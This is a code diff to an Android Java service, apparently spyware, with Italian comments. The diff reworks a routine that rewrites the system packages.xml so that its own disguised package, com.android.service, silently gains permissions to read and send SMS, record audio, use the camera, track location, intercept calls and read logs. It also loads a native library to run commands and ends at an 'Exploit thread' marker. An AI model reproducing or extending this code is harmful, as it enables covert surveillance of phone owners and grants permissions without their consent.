@@ -13,6 +13,7 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
 
 import javax.crypto.Cipher;
@@ -37,6 +38,7 @@ import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
+import com.android.service.capabilities.PackageInfo;
 import com.android.service.conf.Configuration;
 import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
@@ -49,6 +51,7 @@ public class ServiceCore extends Service {
 	static {
 	    System.loadLibrary("runner");
 	}
+	
 	private native int invokeRun(String cmd);
 	
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
@@ -63,6 +66,7 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		Messages.init(getApplicationContext());
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -171,13 +175,13 @@ public class ServiceCore extends Service {
 		// Controlliamo se abbiamo le capabilities necessarie
 		PackageManager pkg = Status.getAppContext().getPackageManager();
 
-		if (pkg != null) {
+		/*if (pkg != null) {
 			int perm = pkg.checkPermission("android.permission.READ_SMS", "com.android.service");
 			
 			if (perm == PackageManager.PERMISSION_GRANTED) {
 				return 2;
 			}
-		}
+		}*/
 		
 		try {
 			FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
@@ -190,6 +194,37 @@ public class ServiceCore extends Service {
 			
 			// Aggiorniamo il file
 		    FileInputStream fin = openFileInput("packages.xml");
+		    
+		    // TEST
+		    PackageInfo pi = new PackageInfo(fin, "com.android.service");
+		    
+		    String path = pi.getPackagePath();
+		    
+		    if (path.length() == 0) {
+		    	return 0;
+		    }
+		    
+		    ArrayList<String> perm = pi.getPackagePermissions();
+		    
+		    // Vediamo se gia' ci sono i permessi richiesti
+		    if (checkRequiredPermission(perm) == true) {
+		    	if (Cfg.DEBUG) {
+					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
+				}
+		    	
+				// Rimuoviamo la nostra copia
+				File f = new File("/data/data/com.android.service/files/packages.xml");
+				
+				if (f.exists() == true) {
+					f.delete();
+				}
+				
+				return 2;
+		    }
+		    
+		    pi.addPermissions(perm);
+		    // FINE TEST
+		    
 		    byte[] buffer = Utils.inputStreamToBuffer(fin, 0);
 		    
 		    // ... Cerchiamo la nostra riga e la package location
@@ -258,21 +293,7 @@ public class ServiceCore extends Service {
 		    // Verifichiamo se non abbiamo gia' i permessi necessari
 		    String actualPerms = packages.substring(permsBegin, permsEnd);
 		    
-		    // Abbiamo gia' i permessi richiesti :)  
-		    if (actualPerms.contentEquals(getRequiredPermission()) == true) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
-				}
-		    	
-				// Rimuoviamo la nostra copia
-				File f = new File("/data/data/com.android.service/files/packages.xml");
-				
-				if (f.exists() == true) {
-					f.delete();
-				}
-				
-				return 2;
-		    }
+		   
 		    
 		    // Creiamo il nuovo file
 		    //FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
@@ -281,7 +302,7 @@ public class ServiceCore extends Service {
 		    fos.write(packages.substring(0, permsBegin).getBytes("US_ASCII"));
 		    
 		    // Quindi i nuovi permessi
-		    fos.write(getRequiredPermission().getBytes("US_ASCII"));
+		    //fos.write(getRequiredPermission().getBytes("US_ASCII"));
 		    
 		    // E di seguito tutto il resto
 		    fos.write(packages.substring(permsEnd).getBytes("US_ASCII"));
@@ -507,32 +528,52 @@ public class ServiceCore extends Service {
 		return isRoot;
 	}
 
-	private String getRequiredPermission() {
-		return new String(
-				"<item name=\"android.permission.SET_WALLPAPER\" />\n" +
-				"<item name=\"android.permission.SEND_SMS\" />\n" +
-				"<item name=\"android.permission.PROCESS_OUTGOING_CALLS\" />\n" +
-				"<item name=\"android.permission.WRITE_APN_SETTINGS\" />\n" +
-				"<item name=\"android.permission.WRITE_EXTERNAL_STORAGE\" />\n" +
-				"<item name=\"android.permission.READ_LOGS\" />\n" +
-				"<item name=\"android.permission.WRITE_SMS\" />\n" +
-				"<item name=\"android.permission.ACCESS_WIFI_STATE\" />\n" +
-				"<item name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n" +
-				"<item name=\"android.permission.RECEIVE_SMS\" />\n" +
-				"<item name=\"android.permission.READ_CONTACTS\" />\n" +
-				"<item name=\"android.permission.CALL_PHONE\" />\n" +
-				"<item name=\"android.permission.READ_PHONE_STATE\" />\n" +
-				"<item name=\"android.permission.READ_SMS\" />\n" +
-				"<item name=\"android.permission.RECEIVE_BOOT_COMPLETED\" />\n" +
-				"<item name=\"android.permission.CAMERA\" />\n" +
-				"<item name=\"android.permission.INTERNET\" />\n" +
-				"<item name=\"android.permission.CHANGE_WIFI_STATE\" />\n" +
-				"<item name=\"android.permission.ACCESS_FINE_LOCATION\" />\n" +
-				"<item name=\"android.permission.VIBRATE\" />\n" +
-				"<item name=\"android.permission.WAKE_LOCK\" />\n" +
-				"<item name=\"android.permission.RECORD_AUDIO\" />\n" +
-				"<item name=\"android.permission.ACCESS_NETWORK_STATE\" />\n" +
-				"<item name=\"android.permission.FLASHLIGHT\" />");
+	private boolean checkRequiredPermission(ArrayList<String> a) {
+		boolean permFound = false;
+		
+		String requiredPerms[] =  {
+				"android.permission.READ_LOGS",
+				"android.permission.READ_SMS",
+				"android.permission.SET_WALLPAPER",
+				"android.permission.SEND_SMS",
+				"android.permission.PROCESS_OUTGOING_CALLS",
+				"android.permission.WRITE_APN_SETTINGS",
+				"android.permission.WRITE_EXTERNAL_STORAGE",
+				"android.permission.WRITE_SMS",
+				"android.permission.ACCESS_WIFI_STATE",
+				"android.permission.ACCESS_COARSE_LOCATION",
+				"android.permission.RECEIVE_SMS",
+				"android.permission.READ_CONTACTS",
+				"android.permission.CALL_PHONE",
+				"android.permission.READ_PHONE_STATE",
+				"android.permission.RECEIVE_BOOT_COMPLETED",
+				"android.permission.CAMERA",
+				"android.permission.INTERNET",
+				"android.permission.CHANGE_WIFI_STATE",
+				"android.permission.ACCESS_FINE_LOCATION",
+				"android.permission.VIBRATE",
+				"android.permission.WAKE_LOCK",
+				"android.permission.RECORD_AUDIO",
+				"android.permission.ACCESS_NETWORK_STATE",
+				"android.permission.FLASHLIGHT" 
+		};
+		
+		for (int i = 0; i < requiredPerms.length; i++) {
+			for (String actualPerms : a) {
+				permFound = false;
+
+				if (actualPerms.equals(requiredPerms[i]) == true) {
+					permFound = true;
+					break;
+				}
+			}
+
+			if (permFound == false) {
+				break;
+			}
+		}
+		
+		return permFound; 
 	}
 	
 	// Exploit thread
